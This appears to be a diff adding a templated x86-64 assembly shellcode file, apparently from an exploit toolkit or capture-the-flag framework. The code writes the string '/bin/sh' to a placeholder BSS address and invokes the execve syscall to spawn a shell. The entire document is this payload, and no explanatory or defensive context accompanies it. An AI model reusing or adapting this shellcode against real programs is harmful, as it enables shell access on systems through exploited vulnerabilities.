@@ -1,0 +1,12 @@
+.intel_syntax noprefix
+
+.global _start
+
+_start:
+movabs  rdi, {{ bss_addr }}
+movabs  rcx, 0x68732f6e69622f
+mov     qword ptr [rdi], rcx
+mov     rax, 0x3b
+mov     rsi, 0
+mov     rdx, 0
+syscall
